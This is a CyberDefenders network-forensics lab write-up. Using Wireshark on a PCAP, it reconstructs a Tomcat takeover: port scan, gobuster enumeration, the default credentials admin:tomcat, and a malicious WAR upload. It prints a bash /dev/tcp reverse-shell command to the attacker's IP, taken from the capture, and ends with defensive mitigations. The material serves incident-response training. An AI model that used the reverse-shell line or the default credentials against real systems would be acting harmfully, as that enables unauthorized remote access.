# 🛡️ Tomcat Takeover Writeup
**Platform:** CyberDefenders
**Category:** Network Forensics
**Difficulty:** Easy
**Tactics:** Reconnaissance, Discovery, Credential Access, Execution, Privilege Escalation, Persistence, Command and Control
**Tools:** Wireshark

## 📝 Objective
The SOC team detected suspicious activity on an intranet web server and captured the traffic to a PCAP file. The goal of this lab is to analyze that capture to reconstruct the full attack chain against an Apache Tomcat server — from initial port scanning through directory enumeration, credential compromise, malicious WAR file upload, and the reverse shell used to maintain access.

## 🔍 Reconnaissance & Enumeration

**Identifying the attacker's source IP**

Filtered on SYN packets without the ACK flag set to isolate connection attempts, then looked for the source sending a high volume of requests across multiple destination ports:

```
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

Attacker IP: `14.0.0.120`

**Attribution**

A lookup of `14.0.0.120` via [whatismyipaddress.com](https://whatismyipaddress.com/ip-lookup) placed the address in China.

> ⚠️ IP geolocation from lookup services is approximate and easily defeated by VPNs/proxies — treat this as an investigative lead, not hard attribution.

**Port scan results**

Traffic showed heavy, sustained scanning against port `8080`, especially in the later stages of the capture — indicating the attacker had identified it as the Tomcat web management interface and was pivoting to exploit it.

**Directory brute-forcing**

Filtering on the attacker's GET requests:

```
ip.src == 14.0.0.120 and http.request.method == GET
```

The HTTP `User-Agent` header on the enumeration requests identified the tool as `gobuster`.

The brute-force uncovered the Tomcat admin panel directory: `/manager`

## ⚔️ Exploitation / Action

**1. Credential compromise**

Inspecting the successful `GET /manager/images/tomcat.gif` request and reading its HTTP `Authorization` header revealed the credentials the attacker used to authenticate to the Tomcat Manager: `admin:tomcat`.

**2. Malicious WAR upload**

Filtering for the attacker's traffic against the manager endpoint:

```
ip.src == 14.0.0.120 and http.request.method == GET && frame contains "manager"
```

surfaced a request for `GET /JXQOZY/ HTTP/1.1`. Following that TCP stream showed the upload origin:

```
Content-Disposition: form-data; name="deployWar"; filename="JXQOZY.war"
```

Malicious file: `JXQOZY.war`

> **Note:** the `GET /JXQOZY/` request is Tomcat serving the *already-deployed* webshell — it's the artifact that pointed to the filename, not the upload itself. The actual upload packet is isolated more precisely with:
> ```
> http.request.method == POST and http contains "filename="
> ```

**3. Reverse shell / persistence**

Tomcat Manager deploys a WAR as a running web application, which is what let the attacker execute code on the host with the manager account's privileges — the privilege escalation step in this chain.

To find the command used to maintain access, filtered for the characteristic shell redirection syntax:

```
tcp contains ">&"
```

This returned several matches; filtering further to the stream sourced from the attacker's IP and following it revealed the reverse shell command:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

This gave the attacker an interactive shell back to `14.0.0.120:443`, maintaining C2 access to the compromised host.

## 🚩 Conclusion
Full attack chain reconstructed from PCAP alone:

1. Port scan discovers Tomcat on `8080`
2. `gobuster` enumerates `/manager`
3. Weak/default credentials (`admin:tomcat`) allow authentication to Tomcat Manager
4. A malicious WAR (`JXQOZY.war`) is deployed via the manager to get code execution
5. A bash reverse shell to `14.0.0.120:443` gives the attacker persistent remote access

## 🛡️ Defensive Mitigations

- **Kill default/weak Tomcat Manager credentials.** `admin:tomcat` is a well-known default pairing — enforce strong, unique credentials for the manager app, restrict it to specific management IPs via `Valve` / firewall rules, and disable the manager app entirely on production hosts that don't need it.
- **Detect and alert on WAR deployment via the manager endpoint.** `POST` requests to `/manager/text/deploy` or `/manager/html/upload` outside of a known maintenance window should trigger a high-priority SIEM alert — legitimate deployments are infrequent and predictable.
- **Egress filtering and reverse-shell detection.** Block or tightly control outbound connections from web server hosts to the internet (especially on ports like 443/4444/8443 used for reverse shells), and add a network detection rule for the `bash -i >& /dev/tcp/...` pattern or generic outbound shell-over-TCP behavior.

---
*Lab: [Tomcat Takeover — CyberDefenders](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)*
